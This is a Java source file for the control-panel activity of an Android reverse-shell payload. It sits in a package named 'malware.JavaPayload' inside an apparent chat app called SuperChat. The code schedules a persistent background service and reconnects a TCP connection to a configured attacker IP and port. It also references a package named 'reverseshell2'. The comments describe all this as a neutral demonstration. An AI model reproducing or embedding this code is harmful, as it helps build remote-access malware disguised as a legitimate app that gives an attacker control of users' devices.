package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;

import com.teamxdevelopers.SuperChat.R;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.config;
import com.teamxdevelopers.SuperChat.malware.JavaPayload.Config.functions;

/*
The controlPanel class extends AppCompatActivity and serves as a user interface for controlling specific actions within the app,
such as uninstalling the app and restarting a connection.
It demonstrates how to programmatically uninstall an application and how to manage services based on the Android version.
 */
public class controlPanel extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control_panel); // Sets the layout for the activity

        final Activity activity = this;

        // Schedules a job or starts a service based on the Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            new functions(activity).jobScheduler(getApplicationContext());
        } else {
            activity.startService(new Intent(getApplicationContext(), mainService.class));
        }

        // Button to uninstall the app
        findViewById(R.id.uninstall).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish(); // Closes the current activity
                Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
                intent.setData(Uri.parse("package:com.example.reverseshell2"));
                intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
                startActivityForResult(intent, 1); // Starts the uninstallation process
            }
        });

        // Button to restart the connection
        findViewById(R.id.restart).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish(); // Closes the current activity
                new tcpConnection(activity, getApplicationContext()).execute(config.IP, config.port); // Restarts the TCP connection
                // Schedules a job or starts a service based on the Android version
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    new functions(activity).jobScheduler(getApplicationContext());
                } else {
                    activity.startService(new Intent(getApplicationContext(), mainService.class));
                }
            }
        });
    }
}
